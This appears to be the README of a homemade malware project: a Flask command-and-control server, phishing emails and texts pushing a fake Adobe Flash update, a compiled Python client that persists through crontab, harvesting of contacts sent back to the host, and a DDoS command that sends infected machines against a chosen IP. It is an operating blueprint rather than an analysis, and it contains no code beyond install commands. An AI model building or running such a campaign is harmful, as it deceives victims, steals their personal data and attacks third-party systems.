# Host installation

	pip install Flask
	pip install python-crontab
	python host_client.py
	
Host ip: 192.168.101.150:5000  --> This is the IP used when testing on the Virtual Network

# Infection

Host is a flask server that accepts incomming request. New email/phone numbers are sent links to the malicious website and prompted to install an Adobe Flash update. The client adds itself to the user's crontab and runs every hour. All emails and phone numbers found on the machine are sent to the host.

# DDOS Attack

Send a POST request to <hostip>:5000/ddos with the victim's ip and count of attacks. All clients who contact to the host after this POST request will send a GET request to the ip every 3 seconds <count> number of times. Send a new request to <hostip>:5000/ddos with ip = '' to end the ddos attack. This does not stop client's who are in the middle of their attack.

# Communication and Detailed Description

Twilio is used to send text messages to victims. SMTP is used to send emails. 

The Host sends out emails to people that look like updates for adobe flash. When the user clicks on the link in the email it redirects to a website that looks like an offical Adobe Flash website. If the user clicks the install button it then downloads a complied python file so the user can not see the code. When the user runs the python file a setup install GUI runs that looks very legit. During the loading bar part a secret python file is made in documents that gets run every hour. This file checks the users computer for contact information such as email/phone numbers and sents that information back to the host. Note: with this script on the users computer more dangerous stuff can be done.
